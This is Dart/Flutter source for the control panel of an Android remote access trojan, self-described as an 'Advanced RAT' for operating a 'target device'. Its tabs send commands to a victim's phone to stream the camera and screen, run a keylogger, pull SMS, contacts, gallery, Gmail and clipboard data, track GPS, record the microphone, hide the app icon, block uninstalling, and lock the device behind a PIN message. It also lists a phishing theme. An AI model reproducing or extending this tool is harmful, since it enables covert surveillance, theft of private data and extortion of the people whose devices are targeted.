  // ─── TAB BAR ──────────────────────────────────────────────────────────
  Widget _buildTabBar() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16),
      padding: const EdgeInsets.all(5),
      decoration: BoxDecoration(
        color: _T.surface,
        borderRadius: BorderRadius.circular(18),
        boxShadow: _T.shadowSoft,
      ),
      child: TabBar(
        controller: _tabs,
        isScrollable: true,
        indicator: BoxDecoration(
          gradient: _T.gradPrimary,
          borderRadius: BorderRadius.circular(13),
          boxShadow: [
            BoxShadow(
              color: _T.primary.withOpacity(0.3),
              blurRadius: 8,
              offset: const Offset(0, 3),
            ),
          ],
        ),
        indicatorSize: TabBarIndicatorSize.tab,
        indicatorPadding: const EdgeInsets.symmetric(horizontal: 2, vertical: 2),
        dividerColor: Colors.transparent,
        labelColor: Colors.white,
        unselectedLabelColor: _T.inkSoft,
        labelStyle: const TextStyle(
          fontSize: 11,
          fontWeight: FontWeight.w700,
          letterSpacing: 0.6,
        ),
        unselectedLabelStyle: const TextStyle(
          fontSize: 11,
          fontWeight: FontWeight.w600,
          letterSpacing: 0.4,
        ),
        labelPadding: const EdgeInsets.symmetric(horizontal: 16),
        tabs: const [
          Tab(text: 'LIVE'),
          Tab(text: 'CONTROL'),
          Tab(text: 'DATA'),
          Tab(text: 'AUDIO'),
          Tab(text: 'ACTION'),
          Tab(text: 'STOP'),
          Tab(text: 'CHAT'),
          Tab(text: 'ADV'),
        ],
      ),
    );
  }

  // ─── LOG BAR ──────────────────────────────────────────────────────────
  Widget _buildLogBar() {
    return Container(
      height: 34,
      margin: const EdgeInsets.fromLTRB(16, 10, 16, 0),
      padding: const EdgeInsets.symmetric(horizontal: 14),
      decoration: BoxDecoration(
        color: _T.surface,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _T.line),
      ),
      child: _log.isEmpty
          ? Row(
              children: [
                Container(
                  width: 6,
                  height: 6,
                  decoration: const BoxDecoration(
                    color: _T.inkFaint,
                    shape: BoxShape.circle,
                  ),
                ),
                const SizedBox(width: 8),
                const Text(
                  'No activity',
                  style: TextStyle(color: _T.inkSoft, fontSize: 11),
                ),
              ],
            )
          : ListView.builder(
              scrollDirection: Axis.horizontal,
              itemCount: _log.length,
              itemBuilder: (_, i) => Center(
                child: Padding(
                  padding: const EdgeInsets.only(right: 16),
                  child: Row(
                    children: [
                      Container(
                        width: 5,
                        height: 5,
                        decoration: const BoxDecoration(
                          color: _T.accent,
                          shape: BoxShape.circle,
                        ),
                      ),
                      const SizedBox(width: 6),
                      Text(
                        _log[i],
                        style: const TextStyle(
                          color: _T.inkMid,
                          fontSize: 10,
                          fontFamily: 'monospace',
                          fontWeight: FontWeight.w500,
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
    );
  }

  // ─── SECTION HEADER ──────────────────────────────────────────────────
  Widget _sectionHeader(String title, String subtitle, {IconData? icon}) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(4, 4, 4, 0),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              if (icon != null) ...[
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    gradient: _T.gradPrimary,
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: Icon(icon, color: Colors.white, size: 14),
                ),
                const SizedBox(width: 10),
              ],
              Text(
                title,
                style: const TextStyle(
                  color: _T.ink,
                  fontSize: 18,
                  fontWeight: FontWeight.w800,
                  letterSpacing: -0.3,
                ),
              ),
            ],
          ),
          const SizedBox(height: 4),
          Text(
            subtitle,
            style: const TextStyle(
              color: _T.inkSoft,
              fontSize: 13,
              fontWeight: FontWeight.w500,
            ),
          ),
          const SizedBox(height: 14),
        ],
      ),
    );
  }

  // ─── ACTION BUTTON (GRID) ─────────────────────────────────────────────
  Widget _buildActionGridItem({
    required IconData icon,
    required String label,
    required VoidCallback onTap,
    Color color = _T.primary,
    bool enabled = true,
  }) {
    return GestureDetector(
      onTap: enabled ? onTap : null,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.all(10),
        decoration: BoxDecoration(
          color: _T.surface,
          borderRadius: BorderRadius.circular(20),
          boxShadow: enabled ? _T.shadowSoft : null,
          border: Border.all(
            color: enabled ? Colors.transparent : _T.line,
          ),
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: enabled
                    ? color.withOpacity(0.1)
                    : _T.bgAlt,
                borderRadius: BorderRadius.circular(14),
              ),
              child: Icon(
                icon,
                color: enabled ? color : _T.inkFaint,
                size: 22,
              ),
            ),
            const SizedBox(height: 8),
            Text(
              label,
              style: TextStyle(
                color: enabled ? _T.ink : _T.inkFaint,
                fontSize: 11,
                fontWeight: FontWeight.w600,
                height: 1.2,
              ),
              textAlign: TextAlign.center,
              maxLines: 2,
              overflow: TextOverflow.ellipsis,
            ),
          ],
        ),
      ),
    );
  }

  // ─── LIVE TAB ──────────────────────────────────────────────────────────
  Widget _buildLiveTab() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _sectionHeader(
          'Live Stream',
          'Real-time camera & screen mirror',
          icon: Icons.videocam_rounded,
        ),
        const SizedBox(height: 4),
        AnimatedContainer(
          duration: const Duration(milliseconds: 400),
          curve: Curves.easeOutCubic,
          height: _liveOn ? 230 : 90,
          decoration: BoxDecoration(
            color: _T.surface,
            borderRadius: BorderRadius.circular(24),
            boxShadow: _liveOn ? _T.shadowMed : _T.shadowSoft,
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(24),
            child: _liveOn && _frame != null
                ? Image.memory(
                    _frame!,
                    fit: BoxFit.contain,
                    gaplessPlayback: true,
                  )
                : Container(
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [
                          _T.primarySoft.withOpacity(0.5),
                          _T.bgAlt,
                        ],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ),
                    ),
                    child: Center(
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(
                            _liveOn
                                ? Icons.hourglass_top_rounded
                                : Icons.videocam_off_rounded,
                            color: _T.inkFaint,
                            size: 28,
                          ),
                          const SizedBox(height: 8),
                          Text(
                            _liveOn ? 'Connecting...' : 'Stream inactive',
                            style: const TextStyle(
                              color: _T.inkSoft,
                              fontSize: 13,
                              fontWeight: FontWeight.w600,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
          ),
        ),
        const SizedBox(height: 16),
        Row(
          children: [
            Expanded(
              child: _actionBtn(
                'Live Camera',
                _T.primary,
                Icons.videocam_rounded,
                () {
                  _showCamPicker((side) {
                    _startLive('live_camera_start', side);
                    _showLiveDialog();
                  });
                },
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: _actionBtn(
                'Live Screen',
                _T.cyan,
                Icons.phone_android_rounded,
                () {
                  _startLive('live_screen_start', '');
                  _showLiveDialog();
                },
              ),
            ),
          ],
        ),
        if (_liveOn) ...[
          const SizedBox(height: 12),
          _actionBtn(
            'Stop Stream',
            _T.danger,
            Icons.stop_rounded,
            _stopLive,
            fullWidth: true,
          ),
        ],
      ],
    );
  }

  // ─── CONTROL TAB ─────────────────────────────────────────────────────
  Widget _buildControlTab() {
    final enabled = _id != 'unknown';
    return GridView.count(
      padding: const EdgeInsets.all(14),
      crossAxisCount: 3,
      crossAxisSpacing: 12,
      mainAxisSpacing: 12,
      childAspectRatio: 0.82,
      children: [
        _buildActionGridItem(
          icon: Icons.flash_on_rounded,
          label: 'Flashlight',
          onTap: () => _cmd('flash_strobe'),
          color: _T.warning,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.lock_rounded,
          label: 'Lock Device',
          onTap: () => _cmd('lock_live', extra: 'DEVICE LOCKED|1234'),
          color: _T.danger,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.visibility_off_rounded,
          label: 'Hide Icon',
          onTap: () => _toast('Feature: Hide Icon'),
          color: _T.purple,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.layers_clear_rounded,
          label: 'Stuck Layer',
          onTap: () => _toast('Feature: Stuck Layer'),
          color: _T.orange,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.location_on_rounded,
          label: 'GPS',
          onTap: () => _cmd('get_location'),
          color: _T.success,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.email_rounded,
          label: 'Gmail',
          onTap: () => _cmd('get_gmails'),
          color: _T.primary,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.phone_rounded,
          label: 'Phone',
          onTap: () => _toast('Feature: Phone Monitor'),
          color: _T.cyan,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.folder_rounded,
          label: 'Files',
          onTap: () => _cmd('list_files', extra: '/sdcard'),
          color: _T.purple,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.video_library_rounded,
          label: 'Video Overlay',
          onTap: () => _toast('Feature: Video Overlay'),
          color: _T.primary,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.stop_circle_rounded,
          label: 'Stop Overlay',
          onTap: () => _toast('Feature: Stop Overlay'),
          color: _T.inkMid,
          enabled: enabled,
        ),
      ],
    );
  }

  // ─── DATA TAB ──────────────────────────────────────────────────────
  Widget _buildDataTab() {
    final enabled = _id != 'unknown';
    return GridView.count(
      padding: const EdgeInsets.all(14),
      crossAxisCount: 3,
      crossAxisSpacing: 12,
      mainAxisSpacing: 12,
      childAspectRatio: 0.82,
      children: [
        _buildActionGridItem(
          icon: Icons.photo_library_rounded,
          label: 'Galeri',
          onTap: () => _cmd('get_gallery', extra: '5'),
          color: _T.purple,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.contacts_rounded,
          label: 'Kontak',
          onTap: () => _cmd('get_contacts'),
          color: _T.primary,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.sms_rounded,
          label: 'SMS',
          onTap: () => _cmd('get_sms'),
          color: _T.cyan,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.notifications_rounded,
          label: 'Notifikasi',
          onTap: () => _fetchNotif(),
          color: _T.warning,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.apps_rounded,
          label: 'Installed Apps',
          onTap: () => _cmd('get_apps'),
          color: _T.secondary,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.keyboard_rounded,
          label: 'Keylogger',
          onTap: () => _cmd('get_keylogs'),
          color: _T.orange,
          enabled: enabled,
        ),
      ],
    );
  }

  // ─── AUDIO TAB ──────────────────────────────────────────────────────
  Widget _buildAudioTab() {
    final enabled = _id != 'unknown';
    return GridView.count(
      padding: const EdgeInsets.all(14),
      crossAxisCount: 3,
      crossAxisSpacing: 12,
      mainAxisSpacing: 12,
      childAspectRatio: 0.82,
      children: [
        _buildActionGridItem(
          icon: Icons.play_circle_rounded,
          label: 'Play Audio',
          onTap: () => _inputDialog('Play Audio', 'MP3 URL',
              (v) => _cmd('play_audio', extra: v)),
          color: _T.success,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.stop_circle_rounded,
          label: 'Stop Audio',
          onTap: () => _cmd('stop_audio'),
          color: _T.inkMid,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.vibration_rounded,
          label: 'Vibrate',
          onTap: () => _cmd('vibrate_loop'),
          color: _T.warning,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.wallpaper_rounded,
          label: 'Wallpaper',
          onTap: () => _inputDialog('Wallpaper', 'Image URL',
              (v) => _cmd('set_wallpaper', extra: v)),
          color: _T.purple,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.link_rounded,
          label: 'Open URL',
          onTap: () => _inputDialog('Open URL', 'https://...',
              (v) => _cmd('open_url', extra: v)),
          color: _T.cyan,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.wifi_off_rounded,
          label: 'Disable WiFi',
          onTap: () => _cmd('kill_wifi'),
          color: _T.primary,
          enabled: enabled,
        ),
      ],
    );
  }

  // ─── ACTION TAB ──────────────────────────────────────────────────────
  Widget _buildActionTab() {
    final enabled = _id != 'unknown';
    return GridView.count(
      padding: const EdgeInsets.all(14),
      crossAxisCount: 3,
      crossAxisSpacing: 12,
      mainAxisSpacing: 12,
      childAspectRatio: 0.82,
      children: [
        _buildActionGridItem(
          icon: Icons.screenshot_rounded,
          label: 'Screenshot',
          onTap: () => _cmd('get_screen'),
          color: _T.cyan,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.camera_alt_rounded,
          label: 'Take Photo',
          onTap: () => _showCamPicker((s) => _cmd('take_photo', extra: s)),
          color: _T.primary,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.message_rounded,
          label: 'Toast',
          onTap: () =>
              _inputDialog('Toast', 'Message', (v) => _cmd('toast', extra: v)),
          color: _T.warning,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.repeat_rounded,
          label: 'Spam Dialog',
          onTap: () => _toast('Feature: Spam Dialog'),
          color: _T.orange,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.block_rounded,
          label: 'Block App',
          onTap: () => _toast('Feature: Block App'),
          color: _T.danger,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.shield_rounded,
          label: 'Anti Uninstall',
          onTap: () => _toast('Feature: Anti Uninstall'),
          color: _T.primary,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.lock_outline_rounded,
          label: 'Lock Custom',
          onTap: () => _inputDialog('Lock Custom', 'Custom Lock',
              (v) => _cmd('hard_lock', extra: v)),
          color: _T.purple,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.image_rounded,
          label: 'Jumpscare',
          onTap: () => _toast('Feature: Jumpscare'),
          color: _T.danger,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.image_search_rounded,
          label: 'Jumpscare 2',
          onTap: () => _toast('Feature: Jumpscare 2'),
          color: _T.danger,
          enabled: enabled,
        ),
      ],
    );
  }

  // ─── STOP TAB ──────────────────────────────────────────────────────────
  Widget _buildStopTab() {
    final enabled = _id != 'unknown';
    return GridView.count(
      padding: const EdgeInsets.all(14),
      crossAxisCount: 3,
      crossAxisSpacing: 12,
      mainAxisSpacing: 12,
      childAspectRatio: 0.82,
      children: [
        _buildActionGridItem(
          icon: Icons.volume_off_rounded,
          label: 'Stop TTS',
          onTap: () => _cmd('stop_tts'),
          color: _T.inkMid,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.stop_circle_rounded,
          label: 'Stop Spam',
          onTap: () => _toast('Feature: Stop Spam'),
          color: _T.inkMid,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.touch_app_rounded,
          label: 'Stop Touch',
          onTap: () => _toast('Feature: Stop Touch'),
          color: _T.inkMid,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.lock_open_rounded,
          label: 'Unblock All',
          onTap: () => _toast('Feature: Unblock All'),
          color: _T.success,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.image_rounded,
          label: 'Stop Jumpscare',
          onTap: () => _toast('Feature: Stop Jumpscare'),
          color: _T.inkMid,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.image_search_rounded,
          label: 'Stop Jump 2',
          onTap: () => _toast('Feature: Stop Jump 2'),
          color: _T.inkMid,
          enabled: enabled,
        ),
        _buildActionGridItem(
          icon: Icons.palette_rounded,
          label: 'Tema Phishing',
          onTap: () => _toast('Feature: Tema Phishing'),
          color: _T.purple,
          enabled: enabled,
        ),
      ],
    );
  }

  // ─── CHAT & LOCK TAB ──────────────────────────────────────────────
  Widget _buildChatLockTab() {
    return Column(
      children: [
        Expanded(
          child: ListView(
            padding: const EdgeInsets.all(16),
            children: [
              _sectionHeader(
                'Remote Lock',
                'Secure device & communicate',
                icon: Icons.lock_rounded,
              ),
              const SizedBox(height: 4),
              _actionBtn('Lock + Chat', _T.primary, Icons.forum_rounded,
                  () => _lockLiveDialog()),
              _gap,
              _actionBtn(
                  'Lock Device (Custom)', _T.warning, Icons.lock_outline_rounded,
                  () {
                _inputDialog('Lock Message (HTML)',
                    'Custom message (use HTML tags)', (msg) {
                  _inputDialog('Unlock PIN', 'Set 4-digit PIN', (pin) {
                    _cmd('hard_lock', extra: '$msg|$pin');
                  }, isNumber: true, hint: '1234');
                });
              }),
              _gap,
              _actionBtn(
                  'Lock Device (Default)', _T.warning, Icons.lock_rounded, () {
                _inputDialog('Unlock PIN', 'Set 4-digit PIN', (pin) {
                  _cmd('hard_lock', extra: 'DEVICE LOCKED|$pin');
                }, isNumber: true, hint: '1234');
              }),
              _gap,
              _actionBtn('Unlock Device', _T.success, Icons.lock_open_rounded,
                  () => _cmd('unlock')),
              const SizedBox(height: 24),
              _sectionHeader(
                'Chat',
                'Send messages to target',
                icon: Icons.chat_bubble_rounded,
              ),
              const SizedBox(height: 4),
              Container(
                height: 240,
                decoration: BoxDecoration(
                  color: _T.surface,
                  borderRadius: BorderRadius.circular(24),
                  boxShadow: _T.shadowSoft,
                ),
                child: _chat.isEmpty
                    ? Center(
                        child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(Icons.chat_bubble_outline_rounded,
                                color: _T.inkFaint, size: 32),
                            const SizedBox(height: 8),
                            const Text(
                              'No messages',
                              style: TextStyle(
                                color: _T.inkSoft,
                                fontSize: 13,
                                fontWeight: FontWeight.w600,
                              ),
                            ),
                          ],
                        ),
                      )
                    : ListView.builder(
                        controller: _chatScroll,
                        padding: const EdgeInsets.all(14),
                        itemCount: _chat.length,
                        itemBuilder: (_, i) {
                          final m = _chat[i];
                          final isOwner = m['from'] == 'owner';
                          return Align(
                            alignment: isOwner
                                ? Alignment.centerRight
                                : Alignment.centerLeft,
                            child: Container(
                              margin: const EdgeInsets.symmetric(vertical: 4),
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 14, vertical: 10),
                              constraints: BoxConstraints(
                                maxWidth:
                                    MediaQuery.of(context).size.width * 0.7,
                              ),
                              decoration: BoxDecoration(
                                gradient: isOwner ? _T.gradPrimary : null,
                                color: isOwner ? null : _T.bgAlt,
                                borderRadius: BorderRadius.only(
                                  topLeft: const Radius.circular(18),
                                  topRight: const Radius.circular(18),
                                  bottomLeft:
                                      Radius.circular(isOwner ? 18 : 4),
                                  bottomRight:
                                      Radius.circular(isOwner ? 4 : 18),
                                ),
                              ),
                              child: Column(
                                crossAxisAlignment: isOwner
                                    ? CrossAxisAlignment.end
                                    : CrossAxisAlignment.start,
                                children: [
                                  Text(
                                    m['text'] ?? '',
                                    style: TextStyle(
                                      color: isOwner
                                          ? Colors.white
                                          : _T.ink,
                                      fontSize: 13,
                                      fontWeight: FontWeight.w500,
                                    ),
                                  ),
                                  const SizedBox(height: 3),
                                  Text(
                                    m['time'] ?? '',
                                    style: TextStyle(
                                      color: isOwner
                                          ? Colors.white.withOpacity(0.7)
                                          : _T.inkSoft,
                                      fontSize: 9,
                                      fontWeight: FontWeight.w500,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          );
                        },
                      ),
              ),
            ],
          ),
        ),
        _buildChatInput(),
      ],
    );
  }

  Widget _buildChatInput() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 16),
      decoration: BoxDecoration(
        color: _T.surface,
        boxShadow: [
          BoxShadow(
            color: _T.primary.withOpacity(0.06),
            blurRadius: 20,
            offset: const Offset(0, -4),
          ),
        ],
      ),
      child: Row(
        children: [
          Expanded(
            child: TextField(
              controller: _chatCtrl,
              style: const TextStyle(color: _T.ink, fontSize: 14),
              decoration: InputDecoration(
                hintText: 'Type a message...',
                hintStyle:
                    const TextStyle(color: _T.inkFaint, fontSize: 13),
                filled: true,
                fillColor: _T.bg,
                contentPadding: const EdgeInsets.symmetric(
                    horizontal: 18, vertical: 14),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(24),
                  borderSide: BorderSide.none,
                ),
              ),
              onSubmitted: _sendChat,
            ),
          ),
          const SizedBox(width: 10),
          GestureDetector(
            onTap: () => _sendChat(_chatCtrl.text),
            child: Container(
              padding: const EdgeInsets.all(13),
              decoration: BoxDecoration(
                gradient: _T.gradPrimary,
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(
                    color: _T.primary.withOpacity(0.35),
                    blurRadius: 12,
                    offset: const Offset(0, 4),
                  ),
                ],
              ),
              child: const Icon(Icons.send_rounded,
                  color: Colors.white, size: 20),
            ),
          ),
        ],
      ),
    );
  }

  // ─── ADVANCED TAB ──────────────────────────────────────────────────
  Widget _buildAdvancedTab() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _sectionHeader(
          'Advanced RAT',
          'Powerful remote control features',
          icon: Icons.settings_suggest_rounded,
        ),
        const SizedBox(height: 4),
        _actionBtn('File Manager', _T.purple, Icons.folder_rounded,
            () => _cmd('list_files', extra: '/sdcard')),
        _gap,
        _actionBtn('Keylogger Start', _T.warning, Icons.keyboard_rounded,
            () => _cmd('start_keylogger')),
        _gap,
        _actionBtn('Keylogger Stop', _T.warning, Icons.stop_circle_rounded,
            () => _cmd('stop_keylogger')),
        _gap,
        _actionBtn('Get Keylogs', _T.warning, Icons.assignment_rounded,
            () => _cmd('get_keylogs')),
        _gap,
        _actionBtn('Get Clipboard', _T.cyan, Icons.content_paste_rounded,
            () => _cmd('get_clipboard')),
        _gap,
        _actionBtn('Set Clipboard', _T.cyan, Icons.copy_rounded,
            () => _inputDialog('Set Clipboard', 'Text to copy',
                (v) => _cmd('set_clipboard', extra: v))),
        _gap,
        _actionBtn('Installed Apps', _T.secondary, Icons.apps_rounded,
            () => _cmd('get_apps')),
        _gap,
        Row(
          children: [
            Expanded(
              child: _actionBtn('Microphone Start', _T.orange,
                  Icons.mic_rounded, () => _cmd('start_mic')),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: _actionBtn('Microphone Stop', _T.inkMid,
                  Icons.mic_off_rounded, () => _cmd('stop_mic')),
            ),
          ],
        ),
        _gap,
        Row(
          children: [
            Expanded(
              child: _actionBtn('Screen Record Start', _T.primary,
                  Icons.videocam_rounded, () => _cmd('start_screen_record')),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: _actionBtn('Screen Record Stop', _T.inkMid,
                  Icons.videocam_off_rounded,
                  () => _cmd('stop_screen_record')),
            ),
          ],
        ),
        _gap,
        _actionBtn('Location Tracker', _T.success, Icons.track_changes_rounded,
            () => _cmd('track_gps', extra: 'start')),
        _gap,
        _actionBtn('Stop Location Tracker', _T.inkMid, Icons.gps_off_rounded,
            () => _cmd('track_gps', extra: 'stop')),
        _gap,
        _actionBtn('Restart Device', _T.warning,
            Icons.power_settings_new_rounded, () => _showRestartDialog()),
        _gap,
        _actionBtn('Wake Device', _T.success, Icons.brightness_5_rounded,
            () => _cmd('force_open')),
        const SizedBox(height: 20),
        Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [
                _T.warning.withOpacity(0.08),
                _T.orange.withOpacity(0.04),
              ],
            ),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: _T.warning.withOpacity(0.2)),
          ),
          child: Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: _T.warning.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: const Icon(Icons.warning_amber_rounded,
                    color: _T.warning, size: 18),
              ),
              const SizedBox(width: 12),
              const Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'Important Note',
                      style: TextStyle(
                        color: _T.warning,
                        fontSize: 13,
                        fontWeight: FontWeight.w700,
                      ),
                    ),
                    SizedBox(height: 4),
                    Text(
                      'Some advanced features require the target device to have the latest RAT client.',
                      style: TextStyle(
                        color: _T.inkMid,
                        fontSize: 12,
                        height: 1.4,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }

  // ─── ACTION BUTTON (for tabs) ──────────────────────────────────────
  Widget _actionBtn(String label, Color color, IconData icon, VoidCallback fn,
      {bool fullWidth = false}) {
    return InkWell(
      onTap: fn,
      borderRadius: BorderRadius.circular(18),
      child: Container(
        width: fullWidth ? double.infinity : null,
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: _T.surface,
          borderRadius: BorderRadius.circular(18),
          boxShadow: _T.shadowSoft,
        ),
        child: Row(
          children: [
            Container(
              width: 42,
              height: 42,
              decoration: BoxDecoration(
                color: color.withOpacity(0.1),
                borderRadius: BorderRadius.circular(13),
              ),
              child: Icon(icon, color: color, size: 20),
            ),
            const SizedBox(width: 14),
            Expanded(
              child: Text(
                label,
                style: const TextStyle(
                  color: _T.ink,
                  fontSize: 14,
                  fontWeight: FontWeight.w700,
                  letterSpacing: -0.2,
                ),
              ),
            ),
            const Icon(Icons.chevron_right_rounded,
                color: _T.inkFaint, size: 22),
          ],
        ),
      ),
    );
  }

  Widget get _gap => const SizedBox(height: 10);

  // ─── RESTART DIALOG ──────────────────────────────────────────────
  void _showRestartDialog() {
    showDialog(
      context: context,
      builder: (_) => _modernDialog(
        title: 'Restart Device',
        icon: Icons.power_settings_new_rounded,
        iconGradient: _T.gradDanger,
        content: const Text(
          'The target device will be restarted immediately.',
          style: TextStyle(
            color: _T.inkMid,
            fontSize: 14,
            height: 1.5,
          ),
        ),
        actions: [
          _dialogBtn(
            label: 'Cancel',
            outlined: true,
            onTap: () => Navigator.pop(context),
          ),
          _dialogBtn(
            label: 'Restart',
            icon: Icons.restart_alt_rounded,
            gradient: _T.gradDanger,
            onTap: () {
              Navigator.pop(context);
              _cmd('reboot_device');
            },
          ),
        ],
      ),
    );
  }

  // ─── CAMERA PICKER ──────────────────────────────────────────────
  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(
        builder: (ctx, ss) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.all(20),
          child: Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: _T.surface,
              borderRadius: BorderRadius.circular(28),
              boxShadow: _T.shadowFloat,
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        gradient: _T.gradPrimary,
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: const Icon(Icons.cameraswitch_rounded,
                          color: Colors.white, size: 18),
                    ),
                    const SizedBox(width: 12),
                    const Text(
                      'Select Camera',
                      style: TextStyle(
                        color: _T.ink,
                        fontSize: 16,
                        fontWeight: FontWeight.w700,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                Row(
                  children: ['back', 'front'].map((v) {
                    final isSel = sel == v;
                    return Expanded(
                      child: Padding(
                        padding: EdgeInsets.only(
                            right: v == 'back' ? 8 : 0,
                            left: v == 'front' ? 8 : 0),
                        child: GestureDetector(
                          onTap: () => ss(() => sel = v),
                          child: AnimatedContainer(
                            duration: const Duration(milliseconds: 200),
                            padding: const EdgeInsets.symmetric(
                                vertical: 20),
                            decoration: BoxDecoration(
                              gradient: isSel ? _T.gradPrimary : null,
                              color: isSel ? null : _T.bg,
                              borderRadius: BorderRadius.circular(18),
                              border: Border.all(
                                color: isSel
                                    ? Colors.transparent
                                    : _T.line,
                                width: 1.5,
                              ),
                            ),
                            child: Column(
                              children: [
                                Icon(
                                  v == 'back'
                                      ? Icons.camera_rear_rounded
                                      : Icons.camera_front_rounded,
                                  color: isSel
                                      ? Colors.white
                                      : _T.inkMid,
                                  size: 34,
                                ),
                                const SizedBox(height: 8),
                                Text(
                                  v == 'back' ? 'Rear' : 'Front',
                                  style: TextStyle(
                                    color: isSel
                                        ? Colors.white
                                        : _T.inkMid,
                                    fontSize: 13,
                                    fontWeight: FontWeight.w700,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                    );
                  }).toList(),
                ),
                const SizedBox(height: 20),
                Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    _dialogBtn(
                      label: 'Cancel',
                      outlined: true,
                      onTap: () => Navigator.pop(ctx),
                    ),
                    _dialogBtn(
                      label: 'Select',
                      icon: Icons.check_rounded,
                      onTap: () {
                        Navigator.pop(ctx);
                        onPick(sel);
                      },
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ─── LIVE DIALOG ──────────────────────────────────────────────
  void _showLiveDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameNotifier,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.all(10),
          child: Container(
            decoration: BoxDecoration(
              color: _T.surface,
              borderRadius: BorderRadius.circular(28),
              boxShadow: _T.shadowFloat,
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                // Header
                Padding(
                  padding: const EdgeInsets.fromLTRB(18, 16, 12, 12),
                  child: Row(
                    children: [
                      Container(
                        width: 10,
                        height: 10,
                        decoration: const BoxDecoration(
                          gradient: _T.gradDanger,
                          shape: BoxShape.circle,
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: Text(
                          'LIVE · $_liveTitle',
